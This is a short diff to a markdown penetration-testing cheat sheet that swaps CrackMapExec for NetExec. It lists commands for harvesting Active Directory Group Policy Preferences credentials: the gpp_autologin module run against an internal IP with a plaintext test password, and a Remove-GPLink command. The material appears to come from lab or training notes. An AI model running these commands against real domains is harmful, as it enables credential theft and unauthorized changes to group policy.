@@ -22,13 +22,13 @@ ls \\<dc>\SYSVOL\<DOMAIN>\scripts
 ### CRACKMAPEXEC
 
 ```
-crackmapexec smb -L | grep gpp
+nxc smb -L | grep gpp
 ```
 
-* Using CrackMapExec's gpp\_autologin Module
+* Using NetExec's gpp\_autologin Module
 
 ```
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 
 Remove-GPLink -Name "MGMTTestGPO" -Target "CN=Default-First-Site-Name,cn=Sites,CN=Configuration,DC=MGMT,DC=EVERGREENHEALTH,DC=SYS"
 ```
